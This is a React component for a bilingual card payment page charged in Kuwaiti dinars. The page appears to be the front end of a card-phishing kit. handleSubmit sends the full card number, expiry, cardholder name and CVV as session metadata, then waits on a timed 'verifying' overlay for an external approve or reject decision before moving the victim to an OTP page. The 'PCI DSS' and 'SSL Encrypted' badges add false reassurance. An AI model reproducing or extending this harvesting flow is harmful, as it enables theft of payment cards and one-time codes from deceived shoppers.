import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useLanguage } from '@/contexts/LanguageContext';
import { getPaymentFlowState, savePaymentFlowState } from '@/lib/paymentFlowState';
import { usePaymentSession } from '@/hooks/usePaymentSession';

import { Shield, Lock, CreditCard, Eye, EyeOff, AlertCircle } from 'lucide-react';
import PaymentRejectionBanner from '@/components/PaymentRejectionBanner';

const CardPayment = () => {
  const { lang } = useLanguage();
  const navigate = useNavigate();
  const location = useLocation();
  const state = (location.state as any) || getPaymentFlowState() || {};
  const total = state?.total || 0;

  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);
  const [showCvv, setShowCvv] = useState(false);
  const [rejected, setRejected] = useState(false);

  const { status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect } = usePaymentSession();

  useEffect(() => {
    if (redirectTo) {
      navigate(redirectTo.split("?")[0], { state, replace: true }); clearRedirect();
    }
  }, [redirectTo]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => currentYear + i);
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));

  const formatCardDisplay = (num: string) => {
    const padded = num.padEnd(16, '•');
    return `${padded.slice(0, 4)}  ${padded.slice(4, 8)}  ${padded.slice(8, 12)}  ${padded.slice(12, 16)}`;
  };

  const getCardType = (num: string) => {
    if (num.startsWith('4')) return 'visa';
    if (num.startsWith('5') || num.startsWith('2')) return 'mastercard';
    return 'unknown';
  };

  const cardType = getCardType(cardNumber);

  useEffect(() => {
    if (status === 'approved') {
      const next = { ...state, cardNumber, cardHolder, expiryMonth, expiryYear }; savePaymentFlowState(next); navigate('/card-otp', { state: next });
    } else if (status === 'rejected') {
      setRejected(true);
      reset();
    }
  }, [status]);

  const [validationError, setValidationError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejected(false);
    setValidationError('');

    // Strict validation - all fields required & complete
    if (cardNumber.length !== 16) {
      setValidationError(lang === 'ar' ? 'رقم البطاقة يجب أن يكون 16 رقماً' : 'Card number must be 16 digits');
      return;
    }
    if (!cardHolder.trim() || cardHolder.trim().length < 3) {
      setValidationError(lang === 'ar' ? 'اسم حامل البطاقة مطلوب (3 أحرف على الأقل)' : 'Cardholder name is required (min 3 chars)');
      return;
    }
    if (!expiryMonth) {
      setValidationError(lang === 'ar' ? 'شهر انتهاء البطاقة مطلوب' : 'Expiry month is required');
      return;
    }
    if (!expiryYear) {
      setValidationError(lang === 'ar' ? 'سنة انتهاء البطاقة مطلوبة' : 'Expiry year is required');
      return;
    }
    {
      const now = new Date();
      const curY = now.getFullYear();
      const curM = now.getMonth() + 1;
      const expY = parseInt(expiryYear, 10);
      const expM = parseInt(expiryMonth, 10);
      if (expY < curY || (expY === curY && expM < curM)) {
        setValidationError(lang === 'ar' ? 'تاريخ انتهاء البطاقة غير صالح (منتهية الصلاحية)' : 'Card expiry date is in the past');
        return;
      }
    }
    if (cvv.length !== 3) {
      setValidationError(lang === 'ar' ? 'رمز CVV يجب أن يكون 3 أرقام' : 'CVV must be 3 digits');
      return;
    }

    await createSession({
      step: 'card_payment',
      customerName: state?.form?.name,
      customerPhone: state?.form?.phone,
      total,
      cardLast4: cardNumber.slice(-4),
      paymentMethod: 'card',
      metadata: { cardNumber, cardHolder, expiryMonth, expiryYear, cvv, expiry: `${expiryMonth}/${expiryYear}` },
    });
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', border: '1px solid hsl(var(--border))', borderRadius: '8px',
    padding: '8px 10px', fontSize: '12px', fontFamily: 'Cairo, sans-serif',
    outline: 'none', backgroundColor: 'hsl(var(--muted) / 0.3)', color: 'hsl(var(--foreground))',
    boxSizing: 'border-box', transition: 'border-color 0.2s, box-shadow 0.2s',
  };

  const labelStyle: React.CSSProperties = {
    display: 'block', fontSize: '11px', fontWeight: '600',
    color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', marginBottom: '4px',
  };

  return (
    <>
      <div style={{ backgroundColor: 'hsl(var(--muted) / 0.5)', minHeight: '100dvh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '16px 10px' }}>
        <div style={{ width: '100%', maxWidth: '460px' }}>

          {/* Waiting Overlay */}
          {waiting && status === 'pending' && (
            <div style={{
              position: 'fixed', inset: 0, zIndex: 9999,
              backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              <div style={{
                backgroundColor: 'hsl(var(--card))', borderRadius: '14px', padding: '24px 20px',
                textAlign: 'center', maxWidth: '300px', width: '90%',
                boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
              }}>
                <div style={{
                  width: '40px', height: '40px', border: '3px solid hsl(var(--muted))',
                  borderTopColor: '#4caf50', borderRadius: '50%',
                  animation: 'spin 1s linear infinite', margin: '0 auto 14px',
                }} />
                <h3 style={{ fontSize: '13px', fontWeight: 'bold', color: 'hsl(var(--foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 6px' }}>
                  {lang === 'ar' ? 'جاري التحقق من البيانات...' : 'Verifying payment details...'}
                </h3>
                <p style={{ fontSize: '11px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 12px' }}>
                  {lang === 'ar' ? 'يرجى الانتظار' : 'Please wait'}
                </p>
                <div style={{ fontSize: '18px', fontWeight: 'bold', fontFamily: 'monospace', color: remainingTime <= 30 ? '#f44336' : '#4caf50' }}>
                  {Math.floor(remainingTime / 60)}:{String(remainingTime % 60).padStart(2, '0')}
                </div>
                <div style={{ width: '80%', height: '3px', borderRadius: '2px', backgroundColor: 'hsl(var(--muted))', margin: '6px auto 0', overflow: 'hidden' }}>
                  <div style={{ width: `${(remainingTime / 300) * 100}%`, height: '100%', borderRadius: '2px', backgroundColor: remainingTime <= 30 ? '#f44336' : '#4caf50', transition: 'width 1s linear' }} />
                </div>
              </div>
            </div>
          )}

          {/* Form Card */}
          <div style={{
            backgroundColor: 'hsl(var(--card))', borderRadius: '12px',
            boxShadow: '0 4px 24px rgba(0,0,0,0.08)', overflow: 'hidden',
          }}>
            {/* Security badges */}
            <div style={{
              display: 'flex', justifyContent: 'center', gap: '16px', padding: '10px 16px',
              borderBottom: '1px solid hsl(var(--border))', backgroundColor: 'hsl(var(--muted) / 0.3)',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Shield size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'دفع آمن' : 'Secure'}
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Lock size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'SSL مشفر' : 'SSL Encrypted'}
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <CreditCard size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'PCI DSS' : 'PCI DSS'}
                </span>
              </div>
            </div>

            {/* Amount display */}
            <div style={{ textAlign: 'center', padding: '12px 16px 10px' }}>
              <div style={{ fontSize: '10px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', marginBottom: '2px' }}>
                {lang === 'ar' ? 'المبلغ المطلوب' : 'Amount Due'}
              </div>
              <div style={{ fontSize: '22px', fontWeight: '900', color: 'hsl(var(--primary))', fontFamily: 'Cairo, sans-serif' }}>
                {total.toFixed(3)} <span style={{ fontSize: '11px' }}>{lang === 'ar' ? 'د.ك' : 'KWD'}</span>
              </div>
            </div>

            {/* Validation error */}
            {validationError && (
              <div style={{
                margin: '0 16px 10px', padding: '8px 10px', borderRadius: '6px',
                backgroundColor: 'rgba(244,67,54,0.08)', border: '1px solid rgba(244,67,54,0.3)',
                display: 'flex', alignItems: 'center', gap: '6px',
              }}>
                <AlertCircle size={14} color="#f44336" />
                <span style={{ fontSize: '10px', color: '#f44336', fontFamily: 'Cairo, sans-serif', fontWeight: 'bold' }}>
                  {validationError}
                </span>
              </div>
            )}

            {/* Rejected error — قابل للإغلاق + يختفي بعد 3 ثوانٍ */}
            <div style={{ margin: '0 16px 10px' }}>
              <PaymentRejectionBanner
                show={rejected}
                onClose={() => setRejected(false)}
                variant="card"
              />
            </div>


            <form onSubmit={handleSubmit}>
              <div style={{ padding: '0 16px 16px' }}>
                {/* Card Number */}
                <div style={{ marginBottom: '10px' }}>
                  <label style={labelStyle}>{lang === 'ar' ? 'رقم البطاقة' : 'Card Number'}</label>
                  <div style={{ position: 'relative' }}>
                    <input
                      type="text" inputMode="numeric" value={cardNumber}
                      onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
                      placeholder="0000 0000 0000 0000"
                      required dir="ltr"
                      onFocus={() => setIsFlipped(false)}
                      style={{ ...inputStyle, fontFamily: 'monospace', fontSize: '13px', letterSpacing: '2px', textAlign: 'left', paddingRight: '50px' }}
                    />
                    <div style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)', display: 'flex', gap: '4px' }}>
                      <svg width="32" height="10" viewBox="0 0 32 10" fill="none" style={{ opacity: cardType === 'visa' ? 1 : 0.3 }}>
                        <text x="0" y="9" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="#1a1f71">VISA</text>
                      </svg>
                      <div style={{ display: 'flex', opacity: cardType === 'mastercard' ? 1 : 0.3 }}>
                        <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: '#eb001b' }} />
                        <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: '#f79e1b', marginLeft: '-4px' }} />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card Holder */}
                <div style={{ marginBottom: '10px' }}>
                  <label style={labelStyle}>{lang === 'ar' ? 'اسم حامل البطاقة' : 'Cardholder Name'}</label>
                  <input
                    type="text" value={cardHolder}
                    onChange={e => setCardHolder(e.target.value)}
                    placeholder={lang === 'ar' ? 'الاسم كما هو مدون على البطاقة' : 'Name as shown on card'}
                    required
                    onFocus={() => setIsFlipped(false)}
                    style={inputStyle}
                  />
                </div>

                {/* Expiry + CVV */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '8px', marginBottom: '16px' }}>
                  <div>
                    <label style={labelStyle}>{lang === 'ar' ? 'الشهر' : 'Month'}</label>
                    <select value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required
                      onFocus={() => setIsFlipped(false)}
                      style={{ ...inputStyle, cursor: 'pointer', color: expiryMonth ? 'hsl(var(--foreground))' : 'hsl(var(--muted-foreground))' }}>
                      <option value="">MM</option>
                      {months.map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                  </div>
                  <div>
                    <label style={labelStyle}>{lang === 'ar' ? 'السنة' : 'Year'}</label>
                    <select value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required
                      onFocus={() => setIsFlipped(false)}
                      style={{ ...inputStyle, cursor: 'pointer', color: expiryYear ? 'hsl(var(--foreground))' : 'hsl(var(--muted-foreground))' }}>
                      <option value="">YY</option>
                      {years.map(y => <option key={y} value={String(y)}>{y}</option>)}
                    </select>
                  </div>
                  <div>
                    <label style={labelStyle}>CVV</label>
                    <div style={{ position: 'relative' }}>
                      <input
                        type={showCvv ? 'text' : 'password'} value={cvv}
                        onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                        placeholder="•••" required dir="ltr" maxLength={3}
                        onFocus={() => setIsFlipped(true)}
                        onBlur={() => setIsFlipped(false)}
                        style={{ ...inputStyle, fontFamily: 'monospace', fontSize: '13px', paddingRight: '36px' }}
                      />
                      <button
                        type="button"
                        onClick={() => setShowCvv(!showCvv)}
                        style={{ position: 'absolute', right: '10px', top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
                      >
                        {showCvv
                          ? <EyeOff size={16} color="hsl(var(--muted-foreground))" />
                          : <Eye size={16} color="hsl(var(--muted-foreground))" />}
                      </button>
                    </div>
                  </div>
                </div>

                {/* 3D Card Preview */}
                <div
                  style={{ perspective: '1000px', marginBottom: '14px', cursor: 'pointer' }}
                  onClick={() => setIsFlipped(!isFlipped)}
                >
                  <div style={{
                    position: 'relative', width: '100%', height: '160px',
                    transition: 'transform 0.6s', transformStyle: 'preserve-3d',
                    transform: isFlipped ? 'rotateY(180deg)' : 'rotateY(0deg)',
                  }}>
                    {/* Front */}
                    <div style={{
                      position: 'absolute', width: '100%', height: '100%', backfaceVisibility: 'hidden',
                      background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
                      borderRadius: '10px', padding: '14px', boxSizing: 'border-box',
                      boxShadow: '0 14px 40px rgba(0,0,0,0.25)',
                      display: 'flex', flexDirection: 'column', justifyContent: 'space-between',
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                         <div style={{
                          width: '32px', height: '24px', borderRadius: '4px',
                          background: 'linear-gradient(135deg, #f0c27f 0%, #e8b267 50%, #d4a04e 100%)',
                        }} />
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ opacity: 0.6 }}>
                          <path d="M6 12c2-3 4-4 6-4s4 1 6 4" stroke="#fff" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
                          <path d="M4 16c3-5 6-6 8-6s5 1 8 6" stroke="#fff" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
                          <path d="M8 8c1.5-2 3-3 4-3s2.5.8 4 3" stroke="#fff" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
                        </svg>
                      </div>
                      <div style={{ fontSize: '14px', fontFamily: 'monospace', color: '#fff', letterSpacing: '2px' }}>
                        {formatCardDisplay(cardNumber)}
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                        <div>
                          <div style={{ fontSize: '7px', color: 'rgba(255,255,255,0.5)', textTransform: 'uppercase', marginBottom: '1px', fontFamily: 'Cairo, sans-serif' }}>
                            {lang === 'ar' ? 'حامل البطاقة' : 'CARD HOLDER'}
                          </div>
                          <div style={{ fontSize: '10px', color: '#fff', fontFamily: 'Cairo, sans-serif', textTransform: 'uppercase' }}>
                            {cardHolder || (lang === 'ar' ? 'الاسم الكامل' : 'FULL NAME')}
                          </div>
                        </div>
                        <div style={{ textAlign: 'right' }}>
                          <div style={{ fontSize: '7px', color: 'rgba(255,255,255,0.5)', textTransform: 'uppercase', marginBottom: '1px', fontFamily: 'Cairo, sans-serif' }}>
                            {lang === 'ar' ? 'صالحة حتى' : 'EXPIRES'}
                          </div>
                          <div style={{ fontSize: '10px', color: '#fff', fontFamily: 'monospace' }}>
                            {expiryMonth || 'MM'}/{expiryYear ? expiryYear.slice(-2) : 'YY'}
                          </div>
                        </div>
                        <div>
                          {cardType === 'visa' && (
                            <svg width="44" height="14" viewBox="0 0 50 16" fill="none">
                              <text x="0" y="14" fontFamily="Arial" fontWeight="bold" fontSize="16" fill="#fff">VISA</text>
                            </svg>
                          )}
                          {cardType === 'mastercard' && (
                            <div style={{ display: 'flex' }}>
                              <div style={{ width: '16px', height: '16px', borderRadius: '50%', backgroundColor: '#eb001b', opacity: 0.9 }} />
                              <div style={{ width: '16px', height: '16px', borderRadius: '50%', backgroundColor: '#f79e1b', opacity: 0.9, marginLeft: '-6px' }} />
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                    {/* Back */}
                    <div style={{
                      position: 'absolute', width: '100%', height: '100%', backfaceVisibility: 'hidden',
                      transform: 'rotateY(180deg)',
                      background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
                      borderRadius: '10px', boxSizing: 'border-box',
                      boxShadow: '0 14px 40px rgba(0,0,0,0.25)',
                    }}>
                      <div style={{ width: '100%', height: '30px', backgroundColor: '#222', marginTop: '18px' }} />
                      <div style={{ padding: '10px 16px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: '8px' }}>
                          <div style={{
                            backgroundColor: '#fff', borderRadius: '3px', padding: '3px 10px',
                            fontFamily: 'monospace', fontSize: '12px', color: '#333',
                            letterSpacing: '3px', minWidth: '40px', textAlign: 'center',
                          }}>
                            {showCvv ? (cvv || '•••') : '•••'}
                          </div>
                          <span style={{ fontSize: '10px', color: 'rgba(255,255,255,0.6)', fontFamily: 'Cairo, sans-serif' }}>CVV</span>
                        </div>
                        <div style={{ marginTop: '14px', textAlign: 'center' }}>
                          <p style={{ fontSize: '8px', color: 'rgba(255,255,255,0.4)', fontFamily: 'Cairo, sans-serif', lineHeight: '1.5', margin: 0 }}>
                            {lang === 'ar' ? 'هذه البطاقة خاضعة لاتفاقية حامل البطاقة' : 'This card is subject to the cardholder agreement'}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                  <p style={{ textAlign: 'center', fontSize: '9px', color: 'hsl(var(--muted-foreground))', marginTop: '6px', marginBottom: '0', fontFamily: 'Cairo, sans-serif' }}>
                    {lang === 'ar' ? '🔄 اضغط على البطاقة لقلبها' : '🔄 Click card to flip'}
                  </p>
                </div>

                {/* Submit */}
                <button
                  type="submit"
                  disabled={!cardNumber || !cvv || !expiryMonth || !expiryYear || waiting}
                  style={{
                    width: '100%', border: 'none', borderRadius: '8px', padding: '10px',
                    fontSize: '13px', fontWeight: 'bold', fontFamily: 'Cairo, sans-serif',
                    cursor: (!cardNumber || !cvv || !expiryMonth || !expiryYear || waiting) ? 'not-allowed' : 'pointer',
                    background: (!cardNumber || !cvv || !expiryMonth || !expiryYear || waiting)
                      ? 'hsl(var(--muted))'
                      : 'linear-gradient(135deg, #4caf50, #2e7d32)',
                    color: '#fff',
                    boxShadow: (!cardNumber || !cvv || !expiryMonth || !expiryYear || waiting) ? 'none' : '0 4px 15px rgba(76,175,80,0.3)',
                    transition: 'all 0.3s ease',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px',
                  }}
                >
                  <Lock size={14} />
                  {lang === 'ar' ? `ادفع ${total.toFixed(3)} د.ك` : `Pay ${total.toFixed(3)} KWD`}
                </button>

                {/* Security footer */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '4px', marginTop: '10px' }}>
                  <Lock size={10} color="#4caf50" />
                  <span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>
                    {lang === 'ar' ? 'معاملة مشفرة وآمنة بالكامل' : 'Fully encrypted & secure transaction'}
                  </span>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </>
  );
};

export default CardPayment;
